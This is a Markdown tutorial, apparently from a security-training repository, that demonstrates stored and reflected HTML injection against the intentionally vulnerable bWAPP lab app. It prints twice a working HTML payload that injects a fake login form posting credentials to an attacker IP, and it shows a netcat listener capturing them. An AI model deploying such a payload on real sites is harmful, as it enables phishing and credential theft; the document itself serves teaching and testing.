# HTML Injection

**HTML injection** is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. 

The HTML injection attack only allows the injection of certain HTML tags. HTML  injection attack is inject HTML code through the vulnerable parts of the website. When an application does not properly handle user supplied data, an attacker can supply valid HTML code, typically via a parameter value, and inject their own content into the page.  The Malicious user sends HTML code through any vulnerable field with the purpose to change the website’s design or any information that is displayed to the user.  This attack is typically used in conjunction with some form of social engineering, as the attack is exploiting a code-based vulnerability and a user's trust. As a result, the user may see the data that was sent by the malicious user. 

**Two Types of HTML Injection**</br>

• [Stored HTML Injection ](#stored-html-injection)</br>
• [Reflected HTML Injection](#reflected-html-injection)</br>
			
**A possible attack scenario is demonstrated below:** </br>

• Attacker discovers injection vulnerability and decides to use an HTML injection attack</br>
• Attacker crafts malicious link, including his injected HTML content, and sends it to a user via email</br>
• The user visits the page due to the page being located within a trusted domain</br>
• The attacker's injected HTML is rendered and presented to the user asking for a username and password</br>
• The user enters a username and password, which are both sent to the attackers server</br>
			
**Impact of the vulnerability:**</br>
This  vulnerability can have many consequences, like disclosure of a user's  session cookies that could be used to impersonate the victim, or, more  generally, it can allow the attacker to modify the page content seen by  the victims.



 # Stored HTML Injection
In this vulnerability the injected malicious script gets permanently store inside the web-applications server. stored HTML injection attack occurs when malicious HTML code is saved in the  web server and is being executed every time the user calls that.</br>
		
How it works, Here we will understand through vulnerable Bee Wapp application.</br>
		
Here we have browsed the target ip at  `http://192.168.43.102/bWAPP/login.php`  and login with the creadential, user : bee and password : bug. shown in figure-1.</br> </br> 
`figure-1`			
![figure-1](https://user-images.githubusercontent.com/83446765/157544299-fb152a97-cd83-4aee-a139-92f5c143c496.png)</br>			

			
Now here we have set the  “Choose Your Bug” option to “HTML Injection – Stored (Blog)” and then clicked on the hack button. shown in figure-2.</br>

`figure-2`
![figure-2](https://user-images.githubusercontent.com/83446765/157544227-bb6e38f4-c8b1-4bdb-81ae-f58146b1e6ee.png)			
			
Now, we’ll be redirected to the web page which is vulnerable from an stored HTML Injection vulnerability which allows the user to submit his entry in the given field as shown in the figure-3.</br>

`figure-3`
![figure-3](https://user-images.githubusercontent.com/83446765/157544250-475ce5b0-283c-4303-a4aa-ecff0d6522e1.png)			
			
Here we intered a normal user entry through user : bee  as “hello” in the given field, in order to confirm that the input data has successfully stored  in the webserver's database as shown in the figure-4 and figure-5.</br>

`figure-4`
![figure-4](https://user-images.githubusercontent.com/83446765/157544321-c183f6e3-3e2d-4c35-83e0-302512629315.png)			
			
`figure-5`
![figure-5](https://user-images.githubusercontent.com/83446765/157544291-9915e34d-006e-4ecf-8d67-533ff63159f7.png)			
			
Here in this we insert a html tag after that in this field we see that here HTML tags are being easily inserted and stored as shown in the figure-6 and figure-7.</br>

`figure-6`
![figure-6](https://user-images.githubusercontent.com/83446765/157544281-7d836202-a05b-41b4-b01f-62d0d5b131e2.png)			
			
`figure-7`
![figure-7](https://user-images.githubusercontent.com/83446765/157544308-0473c24f-239e-4aa0-ba49-21594676e4e4.png)			
			
			
			
Now, inject a malicious code that will create a fake user login form on the targeted web page and it will forward the form details to our IP that is `192.168.43.153`. </br>
			
Enter the following HTML code inside the given field in order to set up the HTML attack. as shown in figure-8.</br>

		<div style=" width: 1900px; height: 1300px; background-color:white; ">
		Please login with valid credenitals:<br>
		<form name="login" action="http://192.168.43.153:8181/login.html">
		<table>
		<tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr>
		<tr><td><input type="submit" value="Login"/></td></tr>
		</table>
		</form>
		</div>
			
`figure-8`
![figure-8](https://user-images.githubusercontent.com/83446765/157544369-45316405-aa54-4a62-9e5a-f4241eb9e028.png)			
			
			
			

			
When we clicked on the “Submit” button, a new login form  appeared on the webpage. This login form is stored now into the application’s web server, which gets rendered every time whenever the victim visits this malicious login page, this web page always have this form which looks official to him as shown in the figure-9.</br>

`figure-9`
![figure-9](https://user-images.githubusercontent.com/83446765/157544379-8d3444b8-a87f-420c-9235-78a7eb558dfd.png)			
			
			
		
			
			
Now enable netcat listener on our ip at port `8181`  in order to capture the victim’s request. as shown in the figure-10.</br>
			
`figure-10`
![figure-10](https://user-images.githubusercontent.com/83446765/157544363-c906d1e4-681c-419c-8ff5-edd5d5daefcc.png)
			
						

				
Now wait, until the victim loads malicious page into his browser, and enters his credentials. as shown in the figure-11.</br>
			
`figure-11`
![figure-11](https://user-images.githubusercontent.com/83446765/157544381-1d2bbbce-2684-464f-ad6a-8a09d0e789d8.png)
			
			
				
			
When victim enters his credentials, then you can see that the user “honey” browse the webpage and tried to login as honey:honey123.</br>
			
Now come back to our listener,  and check what the credentials we got in the response .</br>
in the figure-12 we can see that we have successfully capture the credentials.</br>

`figure-12`
![figure-12](https://user-images.githubusercontent.com/83446765/157544357-e8e856e4-cefc-43cd-85b8-b2ae2dda4a0f.png)			
			
As this application is vulnerable with Stored HTML injection we can inject HTML code which permanently stored on the webserver. when the victim visit malicious web page and provide there credential on that page, if attacker listen at port which is given in the  malicious code then attacker get capture the credentials. </br> 	
						
# Reflected HTML Injection
In  the reflected injection attack case, malicious HTML code is not being  permanently stored on the webserver. Reflected Injection occurs when the  website immediately responds to the malicious input.</br>

**This can be divided into three types:**</br>

◇ [Reflected GET](#reflected-get)</br>
◇ [Reflected POST](#reflected-post)</br>
◇ [Reflected URL](#reflected-url)</br>


Reflected Injection attack can be performed differently according to  the HTTP methods i.e, GET and POST. I would remind, that with POST  method data is being sent and with GET method data is being requested.</br>
To know, which method is used for appropriate website's elements, we can check the source of the page.</br>

# Reflected GET
			
The main difference that we’ll notice between the GET and PUT methods are that in GET parameters are specified in the URL. Let’s check our bWAPP application to see if that is the case.</br>
			
Here we have browsed the target ip at  `http://192.168.43.102/bWAPP/login.php`  and login with the creadential, user : bee and password : bug. shown in figure-13.</br>
			
`figure-13`
![figure-13](https://user-images.githubusercontent.com/83446765/157544303-e805ebef-d15a-4142-ae32-2298adef47c4.png)			 
			
			
Now here we have set the  “Choose Your Bug” option to “HTML Injection – Reflected (GET)” and then clicked on the hack button. shown in figure-14.</br>
			
`figure-14`
![figure-14](https://user-images.githubusercontent.com/83446765/157544377-9789098d-5dbb-4b41-a8ec-99061d936634.png)			
			
Now, we’ll be redirected to the web page which is vulnerable from an Reflected (GET) HTML Injection. as shown in figure-15. </br>			

`figure-15`
![figure-15](https://user-images.githubusercontent.com/83446765/157544247-6aefcac9-589a-4960-8214-62679060c20d.png)			
			
In the first blank field enter “Armour” and in the second field enter “Infosec” then click on go. as shown in figure-16.</br>
			
`figure-16`
![figure-16](https://user-images.githubusercontent.com/83446765/157544261-cbe57dc6-379f-4af0-b98d-a8993475e959.png)			
			
			
Now see in the URL of the page we can see the firstname is Armour and lastname is Infosec. as shown in figure-17.</br>

`figure-17`
![figure-17](https://user-images.githubusercontent.com/83446765/157544273-9a58ea12-4faa-47be-86ae-eba7c4094a3a.png)			
						
Here we inject `<h1>` tag in the url. as shown in figure-18.</br>

`figure-18`
![figure-18](https://user-images.githubusercontent.com/83446765/157544265-f4e30ab5-7133-41d0-8095-c33115df4b98.png)			
			
			
Because this application is vulnerable to HTML injection we inject HTML `<h1>` tag which reflects given input as shown in figure-19. and if we want we can even inject any URL, by clicking the user will be redirected to that site. or if we want so we can inject malicious code also.</br>

`figure-19`
![figure-19](https://user-images.githubusercontent.com/83446765/157544350-1d487eb1-8296-4ba3-b2bf-efaa4b59834d.png)			
			
Here we inject an `<a>` (ancor) tag with `<h1>` tag in the URL. as shown in figure-20.</br>

`figure-20`
![figure-20](https://user-images.githubusercontent.com/83446765/157544340-fcfc80dc-7150-4c29-968b-660f66620797.png)						
			
			
Now if the user will click on Armour then he will be redirect to google.com . as shown in figure-21.</br>

`figure-21`
![figure-21](https://user-images.githubusercontent.com/83446765/157544353-19b8fb02-0934-44b2-ba7d-59a1aa7b3661.png)			
			
We can also inject the HTML tags like this. as shown in figure-22. and reflected content is shown in figure-23.	</br>		

`figure-22`
![figure-22](https://user-images.githubusercontent.com/83446765/157544316-d7c57015-7ec3-4b44-a4c9-a5763fe4086d.png)			
			
`figure-23`
![figure-23](https://user-images.githubusercontent.com/83446765/157544326-4d5e1bbe-8ea4-44d0-9416-d86fd4ba223f.png)			
			
Now, we inject malicious code also. we can inject malicious code by text area field or by url.here we inject malicious code by text area field.
Here in firstname field we entered “to Armour Infosec” and in the lastname field we Enter the following HTML code. in order to set up the HTML attack. as shown in figure-24.</br>	

		<div style=" background-color:white; ">
		Please login with valid credenitals:<br>
		<form name="login" action="http://192.168.43.153:8181/login.html">
		<table>
		<tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr>
		<tr><td><input type="submit" value="Login"/></td></tr>
		</table>
		</form>
		</div>
			
This malicious code will create a fake user login form on the targeted web page and it will forward the form details to form action url that is `http://192.168.43.153:8181` where the atteker capture the credentials .</br>	
			
`figure-24`
![figure-24](https://user-images.githubusercontent.com/83446765/157544312-6e676c60-1666-47ac-9ae8-3a82125d6622.png)			
			
When we clicked on the “go” button, a new login form  appeared on the webpage. as shown in figure-25.</br>	

`figure-25`
![figure-25](https://user-images.githubusercontent.com/83446765/157544337-f8af5872-83ed-4edf-93b2-a1e3dd7b574c.png)			
			
Now enable netcat listener on our ip at port `8181`  in order to capture the victim’s request. as shown in the figure-26.</br>	
			
`figure-26`
![figure-26](https://user-images.githubusercontent.com/83446765/157544239-e1c8153d-5fb8-414a-ae05-7a3e935ce650.png)			
			
Now wait, until the victim open malicious page into his browser, and enters his credentials. as shown in the figure-27.</br>	

`figure-27`
![figure-27](https://user-images.githubusercontent.com/83446765/157544331-bd8a5636-a6a4-4af2-8785-447c60b4e16d.png)			
			
					
When victim enters his credentials, then you can see that the user “rohan” browse the webpage and tried to login as rohan:rohan12345.</br>	
			
Now come back to our listener,  and check what the credentials we got in the response .</br>	
in the figure-28 we can see that we have successfully capture the credentials.</br>	

`figure-28`
![figure-28](https://user-images.githubusercontent.com/83446765/157544234-4c5f3a2d-fdc9-42f3-960e-0a03faf4b8f9.png)			
			
Looks like it worked!</br>		

Now we know GET parameters are specified in the URL like :</br>
`http://192.168.43.102/bWAPP/htmli_get.php?firstname=Armour&lastname=Infosec&form=submit`
					
We can manipulate data directly from the URL and bypass the form. Now the difference between GET and POST methods is that POST encapsulates the data in the HTTP request instead of the URL. So let's look at what this looks like.
			
# Reflected POST
							
Here we have browsed the target ip at `http://192.168.43.102/bWAPP/login.php` and login with the creadential, user : bee and password : bug. shown in figure-29.
			
`figure-29`
![figure-29](https://user-images.githubusercontent.com/83446765/157671977-bb94a198-b4f3-4c04-bd5a-f66969056005.png)			
			
Now here we have set the  “Choose Your Bug” option to “HTML Injection – Reflected (POST)” and then clicked on the hack button. shown in figure-30.
			
`figure-30`
![figure-30](https://user-images.githubusercontent.com/83446765/157671962-ac05d638-ba37-4095-87bb-1fa7b6716066.png)			
			
Now, we’ll be redirected to the web page which is vulnerable from an Reflected (POST) HTML Injection. as shown in figure-31. 			

`figure-31`
![figure-31](https://user-images.githubusercontent.com/83446765/157671994-ca27ce0e-0cf9-4fd1-83c9-35d3adf5ac84.png)			
			
In the first blank field enter “Armour” and in the second field enter “Infosec” then click on go. as shown in figure-32.

`figure-32`
![figure-32](https://user-images.githubusercontent.com/83446765/157672056-e65ba1a5-6d5c-4db1-a6aa-eaed66b776f0.png)			
			
So we can see that we entered data but there is nothing in the URL field. The webpage output comes “Welcome Armour Infosec”. as shown in figure-33.

`figure-33`
![figure-33](https://user-images.githubusercontent.com/83446765/157672045-6ce7b47d-10f2-435d-aad6-ef02704b426a.png)			
			
In this also we can use the same techniques as we used in Reflected (Get) HTML injection. as shown in figure-34 and figure-35.
			
`figure-34`
![figure-34](https://user-images.githubusercontent.com/83446765/157672092-60c4511e-0737-4dfb-bf89-12cec43c759d.png)			
			
			
`figure-35`
![figure-35](https://user-images.githubusercontent.com/83446765/157672114-910ff1b7-70ef-42bb-9868-ac98a89c9562.png)						
			
Because this vulnerable web page use post method so to intercept the data we will be use Brup Suite.
So first thing to do is start Burp Suite. You'll see some configuration options asking if you want to start a project, for right now you can just use a temporary one. Now that Burp suite is running you should see the main application window. The tab we will be focusing on is the Proxy tab, shown here. Now we have to make sure Burp is correctly set up to proxy. Click on the Options tab under Proxy. If you don't have any proxy listeners listed go ahead and click add to create one. Set the listener IP to `127.0.0.1` and the Port to `8080`. Once you are done make sure the “Running” Checkbox is checked. as shown in figure-36.

`figure-36`
![figure-36](https://user-images.githubusercontent.com/83446765/157672138-088af30b-d9e1-4212-aaf6-c175682d39b5.png)			
			
Now move on to configuring our browser. There are other instructions online for other browsers but since Firefox is default on Kali that’s what I’ll show. First open the “Settings” menu and click on the gear labeled “Preferences” or click on the gear labeled “General” → Network Settings → Settings. as shown in figure-37.

`figure-37`
![figure-37](https://user-images.githubusercontent.com/83446765/157672126-ef9e8067-bf72-496f-8f48-3ed65dc736cd.png)			
			
That should open a dialog box called “Connection Settings” and allow you to choose proxy options. Select Manual proxy configuration and enter `127.0.0.1` for the HTTP Proxy and `8080` for the port and select “Use this proxy for all protocols”. as shown in figure-38.

`figure-38`</br>
![figure-38](https://user-images.githubusercontent.com/83446765/157672167-1c7f86e5-8026-49a8-96d3-203ba507dfd3.png)			
			
Now we go to the Brup Suite Proxy Intercept tab and click to start intercept on. as shown in figure-39.

`figure-39`</br>
![figure-39](https://user-images.githubusercontent.com/83446765/157672197-99c508b4-59ab-4d96-bfb2-0b33cc6ec5fa.png)			
			
Now go to the vulnerable web page and here Put some data in the name field, as shown in figure-40 and capture the post request in Brup Suite.

`figure-40`
![figure-40](https://user-images.githubusercontent.com/83446765/157672065-05b325b1-fc80-4c7a-b172-8a3774ac369b.png)			
			
We puted data on web page, here we notice that the site is hanging, this is because Burp suite intercepts every HTTP request that passes through it by default, as shown in figure-41.
so we can see the username and password in Burp Suite! Very cool! In the sense of being through let's try forwarding it and see what happens.
			
`figure-41`
![figure-41](https://user-images.githubusercontent.com/83446765/157672141-ce1eacb0-93ef-49e1-a3ee-60e18020b42f.png)			
			
			
Okay, so the username and password we saw in the intercepted HTTP request were returned to the web page, as shown in figure-42. 

`figure-42`
![figure-42](https://user-images.githubusercontent.com/83446765/157672101-48d9ebbf-3831-44d8-8558-508aadb7b48d.png)			
			
			
Now Put some data in the name field, as shown in figure-43 and capture the post request in Brup Suite.

`figure-43`
![figure-43](https://user-images.githubusercontent.com/83446765/157672076-f558348c-708e-4f0d-b8ca-f9a02a23d344.png)			
			
The intercepted data is shown here  the username and password in the brup suit. as shown in figure-44.

`figure-44`
![figure-44](https://user-images.githubusercontent.com/83446765/157672154-f002f436-c02a-4b64-88bc-128c56991356.png)			
			
Now the cool part of Burp Suite is that we can actually edit the HTTP request before it gets sent to the server. Now inject the html tag in name fields and forward the request.as shown in figure-45.

`figure-45`
![figure-45](https://user-images.githubusercontent.com/83446765/157672153-d2cf21d5-4df8-4b3e-9f7b-9473f1ad49de.png)			
			
We have successfully change the name field in the post request , as shown in figure-46 and apart from this we can also inject a redirect link.

`figure-46`
![figure-46](https://user-images.githubusercontent.com/83446765/157672120-40d35606-b94b-4fde-9c2c-6ab323eb725c.png)			

# Reflected URL
			
Here we have browsed the target ip at `http://192.168.43.102/bWAPP/login.php` and login with the creadential, user : bee and password : bug. shown in figure-47.
	
`figure-47`
![figure-47](https://user-images.githubusercontent.com/83446765/157671985-0b416cc2-2389-4fb3-874e-1bd8b8911ef4.png)			
			
Now here we have set the  “Choose Your Bug” option to “HTML Injection – Reflected (Current URL)” and then clicked on the hack button. shown in figure-48.

`figure-48`
![figure-48](https://user-images.githubusercontent.com/83446765/157671967-cf58ca00-f896-46d7-87b2-3e156be1ee5a.png)			
			
Now, we’ll be redirected to the web page which is vulnerable from an Reflected (URL) HTML Injection. as shown in figure-49. 			

`figure-49`
![figure-49](https://user-images.githubusercontent.com/83446765/157672010-be6e6555-4223-4b87-9614-7d8e7df021e8.png)			
			
			
So first thing to do is start Burp Suite. You'll see some configuration options asking if you want to start a project, for right now you can just use a temporary one. Now that Burp suite is running you should see the main application window. The tab we will be focusing on is the Proxy tab, shown here. Now we have to make sure Burp is correctly set up to proxy. Click on the Options tab under Proxy. If you don't have any proxy listeners listed go ahead and click add to create one. Set the listener IP to `127.0.0.1` and the Port to `8080`. Once you are done make sure the “Running” Checkbox is checked. as shown in figure-50.
	
`figure-50`
![figure-50](https://user-images.githubusercontent.com/83446765/157672146-22964fd8-48b8-4bcb-baef-cc52ca8a4081.png)			
			
Now move on to configuring our browser. There are other instructions online for other browsers but since Firefox is default on Kali that’s what I’ll show. First open the “Settings” menu and click on the gear labeled “Preferences” or click on the gear labeled “General” → Network Settings → Settings. as shown in figure-51.

`figure-51`
![figure-51](https://user-images.githubusercontent.com/83446765/157672133-83aa28c3-278d-4387-b582-00afe9f39b97.png)			
			
That should open a dialog box called “Connection Settings” and allow you to choose proxy options. Select Manual proxy configuration and enter `127.0.0.1` for the HTTP Proxy and “8080” for the port and select “Use this proxy for all protocols”. as shown in figure-52.

`figure-52`</br>
![figure-52](https://user-images.githubusercontent.com/83446765/157672190-bd2660ca-aa6e-4387-86f8-6cce783c7eae.png)			
			
Now we go to the Brup Suite Proxy Intercept tab and click to start intercept on. as shown in figure-53.

`figure-53`
![figure-53](https://user-images.githubusercontent.com/83446765/157672193-bdf7a51d-f2ff-42c8-9b30-4860fe873778.png)			
			
As you can see our current URL is `http://192.168.43.102/bWAPP/htmli_current_url.php` as shown in figure-54 and then capture the request in Brup Suite.

`figure-54`
![figure-54](https://user-images.githubusercontent.com/83446765/157672025-fa73fd03-585c-42d9-af0d-ea120b732a5a.png)			
			
Now capture the request in burp. In the host it's showing the IP, as shown in figure-55.
	
`figure-55`
![figure-55](https://user-images.githubusercontent.com/83446765/157672173-70cead36-45ab-4f33-8ba5-2069f5619098.png)			
			
Now replace the host `192.168.43.102` to armourinfosec.com and forward the request. as shown in figure-56.

`figure-56`
![figure-56](https://user-images.githubusercontent.com/83446765/157672183-acbf72b8-666e-49b8-b30f-c83687c0bf78.png)			
			
Using the HTML injection vulnerability we can change the URL which is specified in the web page. as shown in figure-57.

`figure-57`
![figure-57](https://user-images.githubusercontent.com/83446765/157672018-0705c20b-1b83-4b07-a24d-29c425daa195.png)			
			
And now we can also inject html tag in url. As we can see our current URL is `http://192.168.43.102/bWAPP/htmli_current_url.php` as shown in figure-58 and then capture the request in Brup Suite.

`figure-58`
![figure-58](https://user-images.githubusercontent.com/83446765/157672033-f92fed29-bb34-426c-b17e-42bc09eb1436.png)			
			
Now we captured the request in burp. In the host it's showing the IP and GET request, as shown in figure-59.

`figure-59`
![figure-59](https://user-images.githubusercontent.com/83446765/157672176-c595eafa-18eb-4f66-99b8-9d72cecb3f47.png)			
			
Now insert here HTML tag, as shown in figure-60. And Let's forward and see what happens.

`figure-60`
![figure-60](https://user-images.githubusercontent.com/83446765/157672163-ce903ae1-37dd-43a3-8d20-e670d7ec0444.png)			
			
Here we see in figure-61 the HTML tags are successfully inserted.

`figure-61`
![figure-61](https://user-images.githubusercontent.com/83446765/157672003-1068a4e5-2413-4b2d-a786-352417b5c001.png)			



<h3>Example CVE:</h3>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17223">Stored HTML Injection | Dolibarr CRM/ERP</a></li>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26049">remote arbitrary code execution</a></li>


<h3>Findings</h3>
<li><a href="https://medium.com/@k43p/cve-2019-17223-stored-html-injection-dolibarr-crm-erp-ad1e064d0ca5">Stored HTML Injection | Dolibarr CRM/ERP</a></li>
<li><a href="https://hardik-solanki.medium.com/html-injection-stored-which-ultimately-resulted-into-a-cve-2020-26049-61c1a47dc2e8">HTML Injection-Stored: which ultimately resulted into a CVE-2020–26049</a></li>
	

<h3>References: </h3>
<li><a href="https://medium.com/@app.sec1900/html-injection-reflected-get-d89d614b02e">Medium</a></li> 
<li><a href="https://www.acunetix.com/vulnerabilities/web/html-injection/">Acunetix</a></li>
<li><a href="https://devstringx-technologies.medium.com/html-injection-f1c9fc713d51">Medium</a> </li>
<li><a href="https://www.hackingarticles.in/comprehensive-guide-on-html-injection/">Hackingarticles</a> </li>
<li><a href="https://n00bsecurityblog.wordpress.com/2017/09/09/bwapp-series-html-injection-why-it-matters-and-html-injection-get/">n00bsecurityblog</a></li> 
<li><a href="https://n00bsecurityblog.wordpress.com/2017/09/16/http-injection-reflected-post/">n00bsecurityblog</a> </li>
<li><a href="https://n00bsecurityblog.wordpress.com/2017/09/20/html-injection-reflected-current-url/">n00bsecurityblog</a></li>







